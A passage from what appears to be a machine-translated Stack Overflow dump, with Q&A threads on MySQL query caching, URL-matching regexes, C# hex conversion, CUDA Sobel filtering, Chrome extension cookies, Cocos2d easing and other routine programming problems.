1.  是否可以在每个数据库级别微调查询缓存？
2.  是否可以在每个表的基础上微调查询缓存？
3.  它甚至值得做吗？在关键表上有一个微调的查询缓存，在访问不重要的数据时数据库是否还会卡顿？

提前致谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-18T22:40:00.440

不幸的是，很少有选项可以让您操作 MySQL 查询缓存。

该[`query_cache_limit`](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_query_cache_limit)选项指示 MySQL 不缓存大于设置限制的查询结果。您想要降低此值的原因：

*   一些相对少见的查询返回较大的结果集
*   大多数较慢的查询通常返回小的结果集

[`SQL_NO_CACHE`](http://dev.mysql.com/doc/refman/5.5/en/query-cache-in-select.html)紧跟在语句之后的关键字指示`SELECT`MySQL 不缓存此结果。

相反，您可以将[`query_cache_type`](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_query_cache_type)server 选项设置为，`2`以便仅`SQL_CACHE`缓存使用关键字的查询。

我还建议确保您的查询缓存实际上已被充分使用。`SHOW STATUS LIKE 'Qcache_free_memory';`为您提供此信息。如果您的查询缓存中有很大一部分是空闲的，那么这可能意味着您的数据更改过于频繁，以至于缓存中的结果无法重用。这也可能意味着您的大多数查询返回的结果集大于[`query_cache_limit`](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_query_cache_limit)（这反过来可能表明查询设计不当）。

[这里](http://dev.mysql.com/doc/refman/5.5/en/query-cache-configuration.html)还有一些其他提示。

但是，您正确地想知道这是否值得麻烦。在我看来，查询缓存充其量只是快速数据库的次要因素。适当的索引是*第*一个因素。此外，在许多情况下，您的内存将更好地用于缓存索引（最重要的参数是[`innodb_buffer_pool_size`](http://dev.mysql.com/doc/refman/5.5/en/innodb-parameters.html#sysvar_innodb_buffer_pool_size)InnoDB 表或[`key_buffer_size`](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_key_buffer_size)MyISAM 表）

# matlab - 稀疏三元组到稀疏矩阵matlab

> ID：11091251
> 
> 赞同：0
> 
> 时间：2012-06-18T21:19:18.763
> 
> 标签：matlab, matrix, sparse-matrix

在 MATLAB 中，我可以使用什么命令将稀疏三元组转换为稀疏矩阵？我一直在尝试这个：`B=st_to_msm(A)`，`A`我从“.dat”文件中读取的稀疏三元组在哪里，`B`只是一些变量。

不过，它对我不起作用。我想知道如何修复它，或者是否有另一个命令来进行转换。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-22T17:08:45.880

st_to_msm 的代码是[http://people.sc.fsu.edu/~jburkardt/m_src/st_to_msm/st_to_msm.m](http://people.sc.fsu.edu/~jburkardt/m_src/st_to_msm/st_to_msm.m)

```
 [ nrow, ncol, nnzero ] = st_header_read ( input_file );
  [ row, col, a ] = st_data_read ( input_file, nrow, ncol, nnzero );

  base0 = 0;
  base1 = 1;
  row = st_rebase ( base0, base1, nnzero, row );
  col = st_rebase ( base0, base1, nnzero, col );
  b = sparse ( row, col, a, nrow, ncol, nnzero ); 
```

换句话说，它从文件中读取维度和 3 个向量，并将它们用作函数的参数`sparse`。我怀疑你`A`由这 3 个向量组成，`row`, `col`, `a`。查看文档以`sparse`获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T06:33:40.530

MATLAB 只有 2D 稀疏矩阵，因此 3D 寻址不适用于稀疏矩阵。

您可能想[在 MATLAB Central File Exchange 中检查 N 维稀疏数组](http://www.mathworks.com/matlabcentral/fileexchange/29832-n-dimensional-sparse-arrays)。

# magento - Magento configurable product sku on catalog/category/view

> ID：11091254
> 
> 赞同：1
> 
> 时间：2012-06-18T21:19:20.887
> 
> 标签：magento

I'm sure there is a simple solution for this, however, having searched, I can't find one.

I need to list out all the configurable product skus for the current category on the catalog/category/view.phtml so i can include it in a tracking pixel.

Any help would be gratefully appreciated.

Thanks

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T06:14:56.997

Put this code in the view.phtml file

```
<?php
$productCollections=$_category->getProductCollection()->addAttributeToFilter('type_id','configurable');
foreach($productCollections as $p)
{
        echo $p->getSku();
}
?> 
```

# javascript - 在文本字符串中查找任何 URL，与 Twitter 使用完全相同

> ID：11091257
> 
> 赞同：1
> 
> 时间：2012-06-18T21:19:33.817
> 
> 标签：javascript, regex, twitter

有许多类似的问题，但是他们没有回答 url 没有 , 等的问题`www.`。`http://`我要做的是检查字符串是否包含具有任何类型 url 的 url。Twitter 在您提交推文时执行此操作。

可接受的 URL 包括但不限于：

*   google.com
*   图片.google.com
*   [http://google.com](http://google.com)
*   [http://www.google.com](http://www.google.com)
*   [http://www.google.com/anyquerystring](http://www.google.com/anyquerystring)

[我从Daring Fireball](http://daringfireball.net/2010/07/improved_regex_for_matching_urls)和[这个问题](https://stackoverflow.com/questions/6240973/how-to-extract-a-url-from-a-tweet-with-a-javascript-regex)中尝试过的两个正则表达式：

```
var regex = /\b((?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'\"\\.,<>?\u00AB\u00BB\u201C\u201D\u2018\u2019]))/i;

var regex = /(?:<\w+.*?>|[^=!:'"\/]|^)((?:https?:\/\/|www\.)[-\w]+(?:\.[-\w]+)*(?::\d+)?(?:\/(?:(?:[~\w\+%-]|(?:[,.;@:][^\s$]))+)?)*(?:\?[\w\+%&=.;:-]+)?(?:\#[\w\-\.]*)?)(?:\p{P}|\s|<|$)/; 
```

这是我正在做的测试示例：http: [//jsfiddle.net/3Wn26/5/](http://jsfiddle.net/3Wn26/5/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:05:30.020

我认为没有一种可靠的方法（随着时间的推移）。既然[新 gTLD 即将到来](https://gtldresult.icann.org/)，就很难跟上。无论如何，我试了一下。

```
/
  (
    \b
      (?:(https?|ftp):\/\/)?
      (
        (?:www\d{0,3}\.)?
        (
          [a-z0-9.-]+\.
          (?:[a-z]{2,4}|museum|travel)
          (?:\/[^\/\s]+)*
        )
      )
    \b
  )
/ix 
```

# 捕获组

1.  整个 URL，例如：`http://www.google.com/anyquerystringSAY/Rfy/srA/yh`
2.  协议，例如：`http`
3.  网址包括`www.`，例如：`www.google.com/swrua8rua8rUWRWAURHAJSrjuhFAhjT/Rtgfsbdh`
4.  URL 不包括`www.`, ex:`google.com/sarwar8wa8r/R/A(R8`或`images.google.com/w9r89w9ar8a9sjfriJRIUS(RY/(YUr`

或者，您可以用[此处列出](http://en.wikipedia.org/wiki/List_of_Internet_top-level_domains)`(?:[a-z]{2,4}|museum|travel)`的所有位替换该位，但该列表永远不会停止增长，所以我怀疑它是否值得。（你可以看到我添加了两个例外*博物馆*和*旅行*。）

 **另请注意，我添加了 ftp，如果您不需要它，请随意删除它。

希望这可以帮助。

# [看到它在行动](http://rubular.com/r/J3ix77o5MK)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:50:37.520

```
(# Scheme
 [a-z][a-z0-9+\-.]*:
 (# Authority & path
  //
  ([a-z0-9\-._~%!$&'()*+,;=]+@)?              # User
  ([a-z0-9\-._~%]+                            # Named host
  |\[[a-f0-9:.]+\]                            # IPv6 host
  |\[v[a-f0-9][a-z0-9\-._~%!$&'()*+,;=:]+\])  # IPvFuture host
  (:[0-9]+)?                                  # Port
  (/[a-z0-9\-._~%!$&'()*+,;=:@]+)*/?          # Path
 |# Path without authority
  (/?[a-z0-9\-._~%!$&'()*+,;=:@]+(/[a-z0-9\-._~%!$&'()*+,;=:@]+)*/?)?
 )
|# Relative URL (no scheme or authority)
 ([a-z0-9\-._~%!$&'()*+,;=@]+(/[a-z0-9\-._~%!$&'()*+,;=:@]+)*/?  # Relative path
 |(/[a-z0-9\-._~%!$&'()*+,;=:@]+)+/?)                            # Absolute path
)
# Query
(\?[a-z0-9\-._~%!$&'()*+,;=:@/?]*)?
# Fragment
(\#[a-z0-9\-._~%!$&'()*+,;=:@/?]*)? 
```

RFC 3986。验证字符串是否包含 RFC 3986 中指定的 URL。支持绝对和相对 URL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:38:28.207

我的名为 FuncJS 的简单 JavaScript 库有一个名为“findLinks()”的函数，它应该能够完成您想要的操作。

假设您有一个带有链接的字符串，只需包含在函数参数中，如下所示：

```
findLinks("Visit my website at http://website.com and visit my profile on Twitter at http://twitter.com/yourProfile!"); 
```

然后使用各种方法输出它，例如document.write，输出的字符串应突出显示链接。

要更深入地了解此功能，请阅读[http://docs.funcjs.webege.com/findLinks().html](http://docs.funcjs.webege.com/findLinks().html)上的文档。

希望这对您和其他想要这样做的人有所帮助！:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-19T07:58:39.677

答案是——你不能。

例如，Twitter 将歌手 Will.I.Am 的姓名视为 URL（.am**是**有效的 tld）。

如果不了解每个 tld 的所有域注册规则，就无法知道 URL 是否有效***而无需***测试。

这是我建议你做的。

1.  对你的剧本大方一点。接受几乎所有带有“.”的字符串 在里面。
2.  执行[HTTP HEAD](http://en.wikipedia.org/wiki/HEAD_%28HTTP%29#Request_methods)请求以查看 URL 是否存在。
3.  执行[WHOIS](http://en.wikipedia.org/wiki/Whois)以查看域是否已注册（即使确切的 URL 不匹配）

当然，这并没有考虑到有人可能已经发布了指向他们的 Intranet 的链接——这对他们的一些追随者有用。**

# c# - 将 int32 转换为以 16 为底的字符串

> ID：11091258
> 
> 赞同：2
> 
> 时间：2012-06-18T21:19:36.387
> 
> 标签：c#, .net, .net-micro-framework, .net-gadgeteer

我目前正在尝试将 .NET JSON 编码器转换为 NETMF，但遇到了问题，`Convert.ToString()`因为 NETMF 中没有这样的东西。

编码器的原始行如下所示：

```
Convert.ToString(codepoint, 16); 
```

在查看文档后，`Convert.ToString(Int32, Int32)`它说它是`int32`通过提供 int 作为第一个参数和 base 作为第二个参数来将 an 转换为 int 2、8、10 或 16。

有哪些低级代码说明如何执行此操作或我将如何执行此操作？

从代码中可以看出，我只需要从 a 转换`Int32`为`Int16`.

**编辑**

啊，编码器也想这样做：

```
PadLeft(4, '0'); 
```

在字符串上，这只是在字符串的开头添加 4 '0' + '0' + '0' + '0' 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T21:39:27.493

如果您的意思是要将 32 位整数值更改为以[十六进制](http://en.wikipedia.org/wiki/Hexadecimal)显示值的字符串：

```
string hex = intValue.ToString("x"); 
```

有关变体，请参阅 Stack Overflow 问题*[Convert a number into the hex value in .NET](https://stackoverflow.com/questions/4048929/convert-number-into-hex-value-in-net)*。

免责声明：我不确定[NETMF](http://en.wikipedia.org/wiki/.NET_Micro_Framework)中是否存在此功能，但它是如此基础，我认为它应该存在。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:40:18.980

下面是一些将整数转换为十六进制（以 16 为基数）的示例代码：

```
int num = 48764;   // assign your number

// Generate hexadecimal number in reverse.
var sb = new StringBuilder();
do
{
    sb.Append(hexChars[num & 15]);
    num >>= 4;
} 
while (num > 0);

// Pad with leading 0s for a minimum length of 4 characters.
while (sb.Length < 4)
    sb.Append('0');

// Reverse string and get result.
char[] chars = new char[sb.Length];
sb.CopyTo(0, chars, 0, sb.Length);
Array.Reverse(chars);
string result = new string(chars); 
```

`PadLeft(4, '0')`在字符串前面添加前导 0 以确保最小长度为 4 个字符。

`hexChars`值查找可以简单地定义为字符串：

```
internal static readonly string hexChars = "0123456789ABCDEF"; 
```

**编辑**：替换`StringBuilder`为`List<char>`：

```
// Generate hexadecimal number in reverse.
List<char> builder = new List<char>();
do
{
    builder.Add(hexChars[num & 15]);
    num >>= 4;
}
while (num > 0);

// Pad with leading 0s for a minimum length of 4 characters.
while (builder.Count < 4)
    builder.Add('0');

// Reverse string and get result.
char[] chars = new char[builder.Count];
for (int i = 0; i < builder.Count; ++i)
    chars[i] = builder[builder.Count - i - 1];
string result = new string(chars); 
```

**注意**：有关此转换的讨论，请参阅[Expert .NET Micro Framework](http://www.windowsfordevices.com/files/misc/Kuhner.NETMicroFramework_Ch4_sample.pdf#page=19)的“十六进制数输出”部分。

# c# - 更正将 json 作为原始字符串发送的服务堆栈休息服务的标头

> ID：11091259
> 
> 赞同：2
> 
> 时间：2012-06-18T21:20:04.630
> 
> 标签：c#, javascript, backbone.js, servicestack

我对使用服务堆栈后端的骨干集合提取的简单调用的标头有问题。

返回的响应看起来像一个 json，但只是一个原始字符串，主干不获取集合。

我注意到 fetch 调用总是导致错误，这很奇怪，因为同一 URL 的 curl 请求让我检查一切都很好，并且我恢复了 200 OK 代码。

**编辑：**添加了完整的回复

curl 的调用和接收到的输出

响应的标头

```
> GET /tickets?format=json HTTP/1.1
> User-Agent: curl/7.25.0 (i386-pc-win32) libcurl/7.25.0 zlib/1.2.5
> Host: 192.168.1.50
> Accept: */*
>
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Date: Tue, 19 Jun 2012 13:09:35 GMT
< Server: Mono.WebServer.XSP/2.8.0.0 Win32NT
< X-AspNet-Version: 4.0.30319
< X-Powered-By: ServiceStack/3,69 Win32NT/.NET
< Set-Cookie: ss-id=URB3Ss34BE2FBliYDXEpBQ==; path=/
< Set-Cookie: ss-pid=HAfI68bmXU6jRdTiH0WEBA==; expires=Sat, 19-Jun-2032 13:06:26
 GMT; path=/
< Cache-Control: private, no-cache="Set-Cookie"
< Content-Type: application/json; charset=utf-8
< Content-Length: 459
< Keep-Alive: timeout=15, max=100
* HTTP/1.0 connection set to keep alive!
< Connection: Keep-Alive 
```

作为原始字符串接收的 json

```
[{"id":1,"urgencia":"Normal","fecha":"\/Date(-62135580600000- 0430)\/","ultimaActualizacion":"\/Date(-62135580600000-0430)\/","titulo":"Error 101","descripcion":"Al encender el equipo retorna error 101","status":"A","causas":[],"adjuntos":[],"operadores":[],"citas":[],"estados":[],"comentarios":[{"id":1,"fecha":"\/Date(-62135580600000-0430)\/","editado":"\/Date(-62135580600000-0430)\/","descripcion":"este es un comentario","status":" ","comentarios":[]}]}] 
```

那么如何在服务堆栈中设置标头，以便骨干集合了解这是一个 json 响应？

**更新：**我想我已经找到了问题的根源，它与我的 Nhibernate 模型有关，因为我不能直接将它们用于 Rest 服务，任何其他模型都会解析为正确的类型。但我仍然不知道为什么。会看这个。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T13:43:14.867

我发现问题与此有关，不是标题问题，因为@jonezy 告诉我“即使标题正确，也不意味着响应本身是正确的。”，服务堆栈无法正确序列化与 Nhibernate 关联的模型所以我必须做这样的[事情](http://www.philliphaydon.com/2012/06/using-nhibernate-with-servicestack/)。

可以在[这里找到类似的问题](https://stackoverflow.com/questions/10351451/cant-serialize-nested-nhibernate-entity-for-wcf-web-service)

感谢大家的帮助。

# visual-studio-2010 - Visual Studio 2010 Professional 没有 C 和 C++？

> ID：11091260
> 
> 赞同：0
> 
> 时间：2012-06-18T21:20:11.190
> 
> 标签：visual-studio-2010, visual-studio

我总是用 C# 编程，所以上次安装 VS 时，我记得选择了 C# 模式或类似的东西。但是现在，我正在学习 C，当我去新项目时，C 和 C++ 根本不存在。在不重置所有设置的情况下，我能做些什么来恢复这些语言？

![在此处输入图像描述](../Images/b8f502b6566eb6eec755834986fd0de9.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-09T18:32:02.647

由于这已在评论中解决，但没有人发布答案......您只需使用`C++`编译器并将选项设置为编译为`C`代码，如[Mahesh 所示。](http://imgur.com/oADy3)

# entity-framework - 使用 DbContext 和 EF Code First 更改跟踪差异

> ID：11091263
> 
> 赞同：6
> 
> 时间：2012-06-18T21:20:20.540
> 
> 标签：entity-framework

在使用 EF Code First 时，有两个用于更改跟踪的选项：

1.  基于快照的变更跟踪
2.  使用代理进行基于通知的更改跟踪

使用每种更改跟踪方法运行时，请考虑以下代码。假设一个具有默认配置选项的 DbContext 实例。 

```
var o = context.MySet.First();
o.MyProperty = 42;
context.SaveChanges(); 
```

如果第一行上下文加载和跟踪的实体实例的“MyProperty”值已经为 42，则在第三行调用“SaveChanges”期间，它在更改跟踪器中的状态是不同的。 

1.  基于快照的更改跟踪 - 其状态为“未更改”。 
2.  使用代理进行基于通知的更改跟踪 - 其状态为“已修改”。 

鉴于在基于通知的更改跟踪下，在调用“SaveChanges”期间将向数据库发送不必要的更新语句，我设想大多数开发人员更喜欢基于快照的更改跟踪的行为。 

这种行为差异是故意的吗？

当使用基于通知的更改跟踪和代理时，有没有办法实现与基于快照的更改跟踪相同的行为？

请注意，我认为这与此功能建议有关 -  [http://data.uservoice.com/forums/72025-entity-framework-feature-suggestions/suggestions/1015363-better-change-tracking-for-poco-proxies](http://data.uservoice.com/forums/72025-entity-framework-feature-suggestions/suggestions/1015363-better-change-tracking-for-poco-proxies)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-19T08:09:29.323

这种行为是[故意](http://blog.oneunicorn.com/2011/12/05/should-you-use-entity-framework-change-tracking-proxies/)的。原因是与以相同方式行为的旧实体的向后行为兼容性`EntityObject`- 它们将更改属性计算为与实际修改相同的值。链接的文章还显示，新建议是仅在快照更改跟踪存在性能问题时才使用快照更改跟踪并选择更改跟踪代理。

# iphone - UIWebView 中的 Ajax 超时

> ID：11091270
> 
> 赞同：0
> 
> 时间：2012-06-18T21:21:00.113
> 
> 标签：iphone, ipad, ios5, uiwebview

我正在开发一个 iOS 应用程序，该应用程序通过`UIWebView`. 该页面包含 20 到 40 个按钮。每个都向服务器发送一个 ajax 请求。它在大多数情况下都可以正常工作，但服务器是一个桌面应用程序，可以随时出于任何原因关闭而不会发出警告。使用这些 ajax 请求，不会向用户显示任何输出，因此如果服务器出现故障，用户将不知道。我希望能够收到有关 ajax 超时的通知，然后为用户提供重试或返回主屏幕的选项。我似乎无法找到一种方法来`UIWebView`通知任何失败的 ajax 请求。

起初我以为我可以简单地使用 的`webView:didFailLoadWithError:`方法`UIWebViewDelegate`，但显然它没有通知失败的 ajax 请求。

非常感谢任何建议

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T01:03:01.607

如果发生故障时，在您的 Ajax 故障处理程序中调用 JavaScript 代码，使 location.href 发生更改，则 UIWebViewDelegate shouldStartLoadWithRequest: 方法将被调用，让您有机会在发生故障时执行某些操作。IE

在 Ajax 超时处理代码中：

```
 window.location.href = "myscheme://AjaxFailure"; 
```

在您的 UIWebViewDelegate 处理代码中：

```
- (BOOL) webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType 
{
    NSLog(@"shouldStartLoadWithRequest: url: %@", [[request URL] absoluteString]);
    NSURL *URL = request.URL;
    if ([URL.scheme isEqualToString:@"myscheme"])
    {
     ... notify the user there was an error 
```

# reporting-services - 访问被拒绝：SSRS 2000 中的“DundasWebChart”

> ID：11091271
> 
> 赞同：0
> 
> 时间：2012-06-18T21:21:21.590
> 
> 标签：reporting-services, sql-server-2000, dundas

我在 SQL Server 2000 报告中不断收到以下异常

> 引发了 Microsoft.ReportingServices.ReportRendering.ReportRenderingException 类型的异常。(rrRenderingError) 获取在线帮助
> 
> 引发了 Microsoft.ReportingServices.ReportRendering.ReportRenderingException 类型的异常。访问被拒绝：“DundasWebChart”。

仅当我有带图表的报告时才会发生这种情况。在 IIS 中启用匿名访问被禁用。如果需要更多详细信息，请告诉我。

# c - msleep（毫秒）与 msleep_interruptible（毫秒）

> ID：11091272
> 
> 赞同：2
> 
> 时间：2012-06-18T21:21:21.507
> 
> 标签：c, linux, signals, sleep

我不明白这些的用法：`msleep`而且`msleep_interruptible`......我知道一个是可中断的，另一个是不可中断的，但找不到我可以实际看到的某些用法。我尝试使用函数调用线程来 msleep 并打印说“你好！” 和 msleep(msleep_interruptible) 之后，但看不出有任何区别。任何人都可以帮助我吗，可以举个例子吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T21:49:55.327

不同之处在于当一个信号（例如 SIGINT）被引发并且您为该信号设置一个信号处理程序时会发生什么。

*   `msleep`回去睡觉
*   `msleep_interruptible`返回给调用者（非零值表示剩余的睡眠时间）。

* * *

可中断睡眠的示例：

```
$ perl -Mthreads -E'
   my $stime=time;
   async { sleep(3); kill INT => $$; }->detach();
   $SIG{INT} = sub { warn "Got INT signal after ".(time-$stime)."\n"; };
   sleep(5);
   say time-$stime;
'
Got INT signal after 3
3 
```

它睡了 3 秒而不是 5 秒，因为它被处理的信号打断了。另一个版本将打印以下内容：

```
Got INT signal after 3
5 
```

换句话说，信号处理程序以任何一种方式被调用，但是即使有信号进来，一个版本也不会返回。

# cuda - CUDA中x方向的Sobel滤波器

> ID：11091274
> 
> 赞同：3
> 
> 时间：2012-06-18T21:21:29.767
> 
> 标签：cuda, textures

我正在尝试在每个像素的 x 方向上的灰度图像上应用 sobel 过滤器并显示结果。X方向sobel滤波器是：-

```
-1 0 1   
-2 0 2  
-1 0 1 
```

我没有得到所需的结果。有人可以指出我的错误吗？我正在尝试使用纹理，但我不确定我是否正确使用了它：

```
#include <cuda.h>
#include<iostream>
using namespace std;
#define CudaSafeCall( err ) __cudaSafeCall( err, __FILE__, __LINE__ )
#define CudaCheckError()    __cudaCheckError( __FILE__, __LINE__ )
texture <float,2,cudaReadModeElementType> tex1;
//Kernel for x direction sobel
__global__ void implement_x_sobel(float* garbage,float* output,int width,int height,int              widthStep)
{
int x=blockIdx.x*blockDim.x+threadIdx.x;
int y=blockIdx.y*blockDim.y+threadIdx.y;

float output_value=((0*tex2D(tex1,x,y))+(2*tex2D(tex1,x+1,y))+(-2*tex2D(tex1,x-  1,y))+(0*tex2D(tex1,x,y+1))+(1*tex2D(tex1,x+1,y+1))+(-1*tex2D(tex1,x-1,y+1))+  (1*tex2D(tex1,x+1,y-1))+(0*tex2D(tex1,x,y-1))+(-1*tex2D(tex1,x-1,y-1)));
output[y*widthStep+x]=output_value;
}
//Kernel for y direction sobel
//__global__ void implement_y_sobel(float* input,float* output,int width,int height,int widthStep)
//{

//}
//Host Code
 inline void __cudaSafeCall( cudaError err, const char *file, const int line )
{
#ifdef CUDA_ERROR_CHECK
if ( cudaSuccess != err )
{
    printf("cudaSafeCall() failed at %s:%i : %s\n",
             file, line, cudaGetErrorString( err ) );
    exit( -1 );
}    
#endif

return;
}

inline void __cudaCheckError( const char *file, const int line )
{
#ifdef CUDA_ERROR_CHECK
cudaError err = cudaGetLastError();
if ( cudaSuccess != err )
{
    printf("cudaCheckError() failed at %s:%i : %s\n",
             file, line, cudaGetErrorString( err ) );
   exit( -1 );
}
#endif

return;
}

void sobel(float* input,float* output,int width,int height,int widthStep)
{
cudaChannelFormatDesc     channelDesc=cudaCreateChannelDesc(32,32,0,0,cudaChannelFormatKindFloat);
cudaArray * cuArray;
CudaSafeCall(cudaMallocArray(&cuArray,&channelDesc,width,height));
cudaMemcpyToArray(cuArray,0,0,input,widthStep*height,cudaMemcpyHostToDevice);
tex1.addressMode[0]=cudaAddressModeClamp;
tex1.addressMode[1]=cudaAddressModeClamp;
tex1.filterMode=cudaFilterModeLinear;
tex1.normalized=false;
cudaBindTextureToArray(tex1,cuArray,channelDesc);
float * D_output_x;
float * garbage=NULL;
CudaSafeCall(cudaMalloc(&D_output_x,widthStep*height)); 
dim3 blocksize(16,16);
dim3 gridsize;
gridsize.x=(width+blocksize.x-1)/blocksize.x;
gridsize.y=(height+blocksize.y-1)/blocksize.y;

//kernel call
implement_x_sobel<<<gridsize,blocksize>>>(garbage,D_output_x,width,height,widthStep/sizeof(float));
cudaThreadSynchronize();
CudaCheckError();
CudaSafeCall(cudaMemcpy(output,D_output_x,height*widthStep,cudaMemcpyDeviceToHost));
cudaFree(D_output_x);
cudaFree(garbage);
cudaFreeArray(cuArray);
} 
```

我的主要文件：-

```
#include<iostream>
#include <stdio.h>
#include <stdlib.h>
#include<opencv/highgui.h>
#include<opencv/cv.h>
#include"header.h"
using namespace std;
void main()
{
IplImage* img1=cvLoadImage("C://test.jpg",CV_LOAD_IMAGE_GRAYSCALE); 
if( !img1) {
           printf("ERROR: couldnt load file!\n");
           }
IplImage* img2=cvCreateImage(cvGetSize(img1),IPL_DEPTH_32F,img1->nChannels);
IplImage* img3=cvCreateImage(cvGetSize(img1),IPL_DEPTH_32F,img1->nChannels);
unsigned char * pseudo_input=(unsigned char *)img1->imageData;
float * output=(float*)img2->imageData;
float *input=(float*)img3->imageData;
int s=img1->widthStep/sizeof(float);
for(int w=0;w<=(img1->height);w++)
    for(int h=0;h<(img1->width*img1->nChannels);h++)
    {
        input[w*s+h]= pseudo_input[w*s+h];
            }

sobel(input,output,img1->width,img1->height,img1->widthStep);
cvShowImage("Original Image",img1);
cvShowImage("Sobeled Image",img2);
cvWaitKey(0);
    }} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:49:41.613

`cudaCreateChannelDesc`期望 x、y、z 和 w 分量的位数作为前 4 个参数。`float`纹理应该是 32 。

```
cudaChannelFormatDesc channelDesc = cudaCreateChannelDesc(32, 32, 0, 0, cudaChannelFormatKindFloat); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T15:52:30.963

如果没有更多信息，很难诊断问题。如果您没有得到有意义的输出（例如纹理读取全 0），这意味着您的纹理设置或绑定存在问题。

如果你偏离了一点点，那可能是因为你需要将坐标偏移 0.5f，并且在你这样做的时候，要更加小心地将你的整数显式转换为浮点数。如果您在调用 tex2D() 之前声明并分配浮点值变量，则代码不会运行得更慢。

# google-chrome - 使用 cookie 从 Chrome 扩展发送 XHR 请求

> ID：11091277
> 
> 赞同：10
> 
> 时间：2012-06-18T21:21:33.223
> 
> 标签：google-chrome, google-chrome-extension, xmlhttprequest

我正在尝试将 XHR 请求从 Google Chrome 扩展程序发送到另一个域。这可以正常工作，但我需要随请求发送该域 cookie。有什么办法可以做到这一点？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-02-02T03:19:15.880

确保`manifest.json` **权限**设置**正确**。

`manifest.json`您必须在chrome 扩展程序中正确设置跨站点域请求权限。正确完成后，已经为目标域设置的 cookie 将与您向该域发出的请求一起发送。[manifest.json 文档](http://developer.chrome.com/extensions/manifest.html)

玩的时候要特别小心`localhost:port_number`。您需要在其中完整指定该域`manifest.json`才能使其正常工作。当我的本地主机域没有完整指定时，我最终会出现尴尬的行为。

这就是您希望在`manifest.json`扩展程序中指定 localhost 域的方式（如果有意义的话）：

```
...
"permissions": [
    "http://localhost:3000/"
  ],
... 
```

如果您要发送到目标域的 cookie 尚未设置，您可以使用该方法进行设置，并通过您传递给该方法`chrome.cookies.set`的对象属性指定您想要的域名。文档在这里：[chrome.cookies.set](http://developer.chrome.com/extensions/cookies.html#method-set)。`domain``set`

# iphone - CCBezier 缓出

> ID：11091281
> 
> 赞同：0
> 
> 时间：2012-06-18T21:21:49.860
> 
> 标签：iphone, objective-c, ios, ipad, cocos2d-iphone

目前在 Objective-c 中工作。

我正在为我的精灵绘制一条路径，这一切似乎都很好，但我只有一个问题似乎在任何地方都没有得到回答。

我在贝塞尔曲线中的前两个点相对于第三个点非常接近，当我的精灵沿着这条路径进行动画处理时，它似乎在动画结束时突然停止。

有没有办法控制这个我想让动画保持一致的速度或者可能被缓和？

```
id bezierForward = [CCBezierTo actionWithDuration:totalDistance/300.f bezier:bezier];
[turkey runAction:bezierForward]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:52:50.237

试试这个：

```
id bezierForward = [CCBezierTo actionWithDuration:totalDistance/300.f bezier:bezier];
id easeBezierForward = [CCEaseOut actionWithAction:bezierForward rate:2.0]
[turkey runAction:easeBezierForward]; 
```

您将希望使用速率值来查看最终对您来说看起来最好的东西。您可能需要尝试其他一些`CCEaseOut`选项，例如`CCEaseSineOut`

链接：[Cocos2d 简易操作指南](http://www.cocos2d-iphone.org/wiki/doku.php/prog_guide%3aactions_ease)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:14:38.107

根据文档，可能应该是这样的：

```
id bezierForward = [CCEaseOut actionWithDuration:totalDistance/300.f bezier:bezier];
[turkey runAction:bezierForward]; 
```

如文档中所述：

> **变化**
> 
> CCEaseIn：开始加速
> 
> CCEaseOut：加速结束
> 
> CCEaseInOut：开始/结束时的加速度

# jquery - jQuery根据菜单脚本破坏锚标记事件

> ID：11091288
> 
> 赞同：0
> 
> 时间：2012-06-18T21:22:22.383
> 
> 标签：jquery, jsfiddle

我找到了一个关于 css 技巧的教程来制作一个简单的手风琴。

[http://css-tricks.com/snippets/jquery/simple-jquery-accordion/](http://css-tricks.com/snippets/jquery/simple-jquery-accordion/)

我注意到这并不是真正基于导航，但我可以看到它是如何工作的，所以我做了一些简单的调整以使其与无序列表导航菜单一起工作。但当时，即使我让动画运行得很好，但我没有意识到这会破坏实际的锚点点击事件。

```
var allPanels = $('.sub-menu').hide();

$('li.menu-item a').click(function() {
    allPanels.slideUp();
    $(this).parent().find('ul').slideDown();
    return false;
}); 
```

请参阅我创建的用于演示问题的[jsfiddle 。](http://jsfiddle.net/Yj4px/2/)

[http://jsfiddle.net/Yj4px/2/](http://jsfiddle.net/Yj4px/2/)

如您所见，所有链接都已失效，只需激活脚本即可。

我真的很感激任何指示，因为我正在努力解决这个问题。我真的很想不惜一切代价避免使用 jquery 插件。提前致谢。

* * *

猜测一下，脚本只需要运行`li.menu-item`包含一个`ul`- 我无法添加类，因为菜单将由 cms 动态生成，并且可以随时更改。所以脚本需要自己运行。

* * *

## 回答 #1

> 赞同：3
> 
